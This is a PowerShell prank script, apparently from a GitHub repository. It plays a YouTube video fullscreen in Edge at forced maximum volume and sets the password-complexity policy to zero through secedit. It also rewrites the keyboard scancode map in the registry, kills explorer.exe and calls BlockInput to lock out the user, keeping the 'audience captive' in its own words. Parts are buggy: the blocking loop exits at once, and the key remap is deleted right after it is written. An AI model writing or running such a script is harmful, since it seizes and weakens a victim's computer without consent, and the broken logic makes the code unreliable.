#src https://github.com/stefanstranger/PowerShell/blob/master/WinKeys.ps1
$source = @"
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Windows.Forms;
namespace KeyboardSend
{
    public class KeyboardSend
    {
        [DllImport("user32.dll")]
        public static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);
        private const int KEYEVENTF_EXTENDEDKEY = 1;
        private const int KEYEVENTF_KEYUP = 2;
        public static void KeyDown(Keys vKey)
        {
            keybd_event((byte)vKey, 0, KEYEVENTF_EXTENDEDKEY, 0);
        }
        public static void KeyUp(Keys vKey)
        {
            keybd_event((byte)vKey, 0, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
        }
    }
}
"@
Add-Type -TypeDefinition @'
using System.Runtime.InteropServices;
[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume
{
    // f(), g(), ... are unused COM method slots. Define these if you care
    int f(); int g(); int h(); int i();
    int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);
    int j();
    int GetMasterVolumeLevelScalar(out float pfLevel);
    int k(); int l(); int m(); int n();
    int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);
    int GetMute(out bool pbMute);
}
[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice
{
    int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);
}
[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator
{
    int f(); // Unused
    int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);
}
[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
public class Audio
{
    static IAudioEndpointVolume Vol()
    {
        var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;
        IMMDevice dev = null;
        Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(/*eRender*/ 0, /*eMultimedia*/ 1, out dev));
        IAudioEndpointVolume epv = null;
        var epvid = typeof(IAudioEndpointVolume).GUID;
        Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, /*CLSCTX_ALL*/ 23, 0, out epv));
        return epv;
    }
    public static float Volume
    {
        get { float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v; }
        set { Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty)); }
    }
    public static bool Mute
    {
        get { bool mute; Marshal.ThrowExceptionForHR(Vol().GetMute(out mute)); return mute; }
        set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }
    }
}
'@
Add-Type -TypeDefinition $source -ReferencedAssemblies "System.Windows.Forms"

Function FullScreen ()
{
    [KeyboardSend.KeyboardSend]::KeyDown("LWin")
    [KeyboardSend.KeyboardSend]::KeyDown("LShiftKey")
    [KeyboardSend.KeyboardSend]::KeyDown("Return")
    [KeyboardSend.KeyboardSend]::KeyUp("LWin")
    [KeyboardSend.KeyboardSend]::KeyUp("LShiftKey")
    [KeyboardSend.KeyboardSend]::KeyUp("Return")
}

Function KillKeyLayout ()
{
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 0000000000000000030000004de01de04be01d0000000000 /f
    reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /f
}    

Function DisableSecureLogOn () 
{
    #wraps Secedit to perform command since Powershell can't
    #current replaces password policy. Want to change to edit Secure Log On (that requires CTRL ALT DEL)
    secedit /export /cfg c:\new.cfg
    ${c:new.cfg}=${c:new.cfg} | % {$_.Replace('PasswordComplexity=1', 'PasswordComplexity=0')}
    secedit /configure /db $env:windir\security\new.sdb /cfg c:\new.cfg /areas SECURITYPOLICY
    del c:\new.cfg
}

# Start the app
$app='microsoft-edge'
$value='https://www.youtube.com/embed/qxEh09JttN4?rel=0&amp;autoplay=1;fs=0;autohide=0;hd=0;playlist=qxEh09JttN4&autoplay=1&loop=1'
$startString = $app + ":" + $value
start $startString

# Wait and send key stroke 
sleep 1
FullScreen
$code = @"
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
"@

$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru

function Disable-UserInput($seconds) {
    $userInput::BlockInput($true)
    $date1 = Get-Date
    $date2 = Get-Date
    while (1 -gt 0){
        if ((New-TimeSpan -Start $date1 -End $date2).TotalSeconds -lt 100){break}
        $date2 = Get-Date
        Start-Sleep 1
        [audio]::Volume = 1.0 # 0.2 = 20%, etc.
        [audio]::Mute = $false
    }
    
    $userInput::BlockInput($false)
    start explorer.exe
}

DisableSecureLogOn
KillKeyLayout

# Restart explorer to force it to load the bad key layout
taskkill /f /im explorer.exe
start explorer.exe

# Now kill explorer again. Because we want our audience captive. :)
taskkill /f /im explorer.exe

Disable-UserInput -seconds 100 | Out-Null
